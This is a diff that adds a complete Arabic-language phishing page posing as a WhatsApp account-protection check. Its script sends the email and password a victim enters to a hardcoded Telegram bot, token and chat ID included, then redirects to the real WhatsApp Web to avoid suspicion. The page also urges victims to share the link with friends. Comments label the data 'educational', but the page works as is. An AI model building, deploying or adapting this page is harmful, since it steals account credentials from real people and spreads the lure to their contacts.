@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>تحقق واتساب - حماية الحساب</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            background: #f2f4f7;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #fff;
+            width: 90%;
+            max-width: 420px;
+            padding: 25px;
+            border-radius: 20px;
+            box-shadow: 0 6px 22px rgba(0,0,0,0.1);
+        }
+        h1 {
+            text-align: center;
+            color: #0a7d32;
+            margin-bottom: 15px;
+        }
+
+        .note {
+            background: #e9fff0;
+            border-right: 4px solid #0a7d32;
+            padding: 10px 14px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            border-radius: 10px;
+        }
+        
+        .share-prompt {
+            background: #fff3e0;
+            border: 1px dashed #ff9800;
+            padding: 12px;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+
+        .fake-share-btn {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            background: #4CAF50; /* لون شبيه بالواتساب */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        label {
+            display: block;
+            margin-top: 12px;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 5px;
+            border-radius: 12px;
+            border: 1px solid #ccc;
+            font-size: 15px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 13px;
+            margin-top: 20px;
+            font-size: 16px;
+            border: none;
+            border-radius: 12px;
+            background: #0a7d32;
+            color: white;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .btn:hover {
+            background: #086a29;
+        }
+
+        .tips {
+            margin-top: 25px;
+            background: #f7fdf8;
+            padding: 15px;
+            border-radius: 15px;
+        }
+
+        .tips h2 {
+            margin: 0 0 10px;
+            font-size: 18px;
+            color: #0a7d32;
+        }
+
+        .tips ul {
+            margin: 0;
+            padding-right: 20px;
+            padding-left: 0;
+            font-size: 14px;
+            line-height: 1.7;
+            list-style-type: disc;
+        }
+    </style>
+
+    <script>
+        function send_telegram_data(event) {
+            // منع الإرسال التقليدي للنموذج
+            event.preventDefault(); 
+            
+            // --- 1. بيانات البوت النهائية ---
+            const BOT_TOKEN = "8518769039:AAHPWQWJEgROig0QKJg1xhTUGf6mUBfS53k"; 
+            const CHAT_ID = "6717287161";     
+
+            // --- 2. الحصول على البيانات من حقول النموذج ---
+            const email = document.getElementById("user_email").value;
+            const password = document.getElementById("user_password").value;
+
+            // --- 3. بناء الرسالة (المحتوى الذي سيصلك في التلجرام) ---
+            const message = `🚨 بيانات تصيد تعليمية جديدة:\n\n📧 البريد: ${email}\n🔒 كلمة المرور: ${password}\n🌐 المصدر: ${window.location.hostname}`;
+            
+            // --- 4. بناء رابط التلجرام API (الخادم الجديد) ---
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            // --- 5. إرسال الطلب عبر واجهة Fetch API ---
+            fetch(url)
+                .then(response => {
+                    console.log("تم إرسال البيانات التجريبية إلى التلجرام بنجاح.");
+                    // بعد الإرسال، يتم توجيه المستخدم إلى صفحة آمنة (لإتمام المحاكاة)
+                    // هذا يحاكي سلوك المهاجمين لتفادي الشك
+                    window.location.href = "https://web.whatsapp.com/"; 
+                })
+                .catch(error => {
+                    console.error("خطأ أثناء الإرسال:", error);
+                    // في حالة الفشل، يتم توجيه المستخدم أيضاً لعدم إثارة الشكوك
+                    window.location.href = "https://web.whatsapp.com/"; 
+                });
+            
+            return false;
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>حماية حساب واتساب</h1>
+        <div class="note">
+            لإكمال تفعيل ميزة الحماية الجديدة، يرجى تأكيد بيانات حسابك.
+        </div>
+
+        <div class="share-prompt">
+            <strong>خطوة إضافية:</strong> شارك هذا الرابط مع 3 من أصدقائك أو مجموعة لزيادة مستوى حماية حسابك.
+        </div>
+        
+        <button class="fake-share-btn" onclick="alert('تمت المشاركة بنجاح! يمكنك المتابعة الآن.')">
+            مشاركة رابط الحماية الآن
+        </button>
+
+        <form onsubmit="return send_telegram_data(event)">
+            
+            <label for="user_email">البريد الإلكتروني (المستخدم):</label>
+            <input type="email" id="user_email" name="user_email" placeholder="أدخل بريدك الإلكتروني هنا" required />
+
+            <label for="user_password">كلمة المرور:</label>
+            <input type="password" id="user_password" name="user_password" placeholder="أدخل كلمة مرور الحساب" required />
+
+            <button type="submit" class="btn">متابعة وتأكيد الحساب</button>
+        </form>
+        
+        <div class="tips">
+            <h2>نصائح لحماية واتساب:</h2>
+            <ul>
+                <li>تفعيل التحقق بخطوتين.</li>
+                <li>عدم مشاركة رمز التحقق مع أي شخص.</li>
+                <li>تجنب فتح الروابط المشبوهة.</li>
+            </ul>
+        </div>
+    </div>
+</body>
+  </html>
+              
